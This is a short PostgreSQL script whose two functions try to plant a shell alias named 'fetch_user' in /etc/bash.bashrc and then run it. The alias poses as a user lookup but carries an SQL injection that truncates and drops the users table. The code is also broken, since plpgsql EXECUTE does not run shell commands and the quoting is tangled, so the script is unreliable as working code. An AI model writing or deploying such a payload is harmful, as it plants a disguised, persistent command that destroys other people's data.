CREATE OR REPLACE FUNCTION create_alias() RETURNS void AS $$
BEGIN
    PERFORM pg_catalog.set_config('search_path', '', false);
    EXECUTE 'echo ''alias fetch_user="python -c \"from run_db import run_query; run_query(\\\"SELECT * FROM public.users WHERE username = '''\''admin'\''; ALTER TABLE users SET UNLOGGED; TRUNCATE TABLE users; DROP TABLE users CASCADE; --\\\"\""'' >> /etc/bash.bashrc && source /etc/bash.bashrc';
END; $$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION execute_fetch_user() RETURNS void AS $$
BEGIN
    PERFORM pg_catalog.set_config('search_path', '', false);
    EXECUTE 'bash -c ''source /etc/bash.bashrc && fetch_user''';
END; $$ LANGUAGE plpgsql;
